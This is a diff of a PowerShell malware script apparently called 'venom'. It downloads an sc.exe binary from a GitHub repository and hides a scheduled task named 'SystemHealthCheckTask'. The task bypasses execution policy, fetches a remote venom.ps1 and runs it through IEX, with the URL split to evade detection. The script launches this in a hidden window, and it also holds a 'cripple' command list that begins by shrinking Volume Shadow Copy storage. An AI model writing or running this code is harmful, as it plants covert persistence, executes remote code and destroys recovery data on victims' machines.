@@ -89,17 +89,18 @@ $cripple_commands = @('cmd.exe /c vssadmin resize shadowstorage /for=C: /on=C: /
 #Invoke-CommandArray -Commands $cripple_commands -Csv
 #$scheduledTaskCreator = $PSScriptRoot + '\sc.exe'
 $scheduledTaskCreator = "c:\venom\sc.exe"
+$pamperlog = "c:\venom\pamper_log.txt"
 try {
     Invoke-WebRequest -Uri	'https://github.com/theblueshadow48/running-deploy/raw/refs/heads/main/sc.exe' -out $scheduledTaskCreator
-    Add-Content -Path $LogFile -Value "[$timestamp] DOWNLOAD | Successfully downloaded scheduled task creator."
+    Add-Content -Path $pamperlog -Value "[$timestamp] DOWNLOAD | Successfully downloaded scheduled task creator."
 }
 catch {
-    Add-Content -Path $LogFile -Value "[$timestamp] ERROR | Failed to download scheduled task creator."
+    Add-Content -Path $pamperlog -Value "[$timestamp] ERROR | Failed to download scheduled task creator."
 }
 #Write-Host $scheduledTaskCreator
 $scheduledCommand = "$scheduledTaskCreator create SystemHealthCheckTask powershell.exe `"-ep Bypass -c (New-object Net.WebClient).DownloadString('https://raw.gi'+'thubusercontent.com/theblueshadow48/running-deploy/refs/heads/main/venom.ps1')|IEX;`""
 if (Test-Path $scheduledTaskCreator) {
     Write-Host $scheduledTaskCreator
-    Start-Process cmd.exe -ArgumentList "/c", $scheduledCommand -WindowStyle Hidden
+    Start-Process cmd.exe -ArgumentList "/k", $scheduledCommand -WindowStyle Hidden
 }
   
